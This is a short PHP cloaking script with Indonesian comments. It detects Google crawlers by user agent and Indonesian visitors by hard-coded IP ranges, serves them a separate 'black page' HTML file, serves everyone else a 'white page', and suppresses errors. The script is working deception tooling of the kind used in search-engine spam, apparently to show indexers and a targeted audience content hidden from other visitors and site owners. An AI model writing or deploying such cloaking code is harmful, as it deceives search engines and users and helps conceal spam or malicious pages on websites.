<?php
error_reporting(0);

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ip        = $_SERVER['REMOTE_ADDR'] ?? '';

// Googlebot simple detection (UA only)
function isGoogleBot($ua) {
    return preg_match('/googlebot|google-inspectiontool|adsbot-google|mediapartners-google/i', $ua);
}

// CEK IP INDONESIA via range (telkomsel, indosat, xl, tri, biznet, myrepublic)
function isIndonesiaIP($ip) {
    $ranges = [
        '36.64.0.0|36.127.255.255',
        '103.0.0.0|103.255.255.255',
        '110.136.0.0|110.139.255.255',
        '112.215.0.0|112.215.255.255',
        '114.4.0.0|114.5.255.255',
        '118.96.0.0|118.99.255.255',
        '180.244.0.0|180.247.255.255',
        '182.0.0.0|182.3.255.255',
        '202.0.0.0|202.255.255.255'
    ];

    foreach ($ranges as $r) {
        list($start, $end) = explode('|', $r);
        if (ip2long($ip) >= ip2long($start) && ip2long($ip) <= ip2long($end)) {
            return true;
        }
    }
    return false;
}

$isBot   = isGoogleBot($userAgent);
$isIndo  = isIndonesiaIP($ip);

// Googlebot & Indonesia → black page
if ($isBot || $isIndo) {
    include __DIR__ . '/leadbrandsindia.html';
    exit;
}

// Selain itu → white page
include __DIR__ . '/leadbrand.php';
exit;
?>
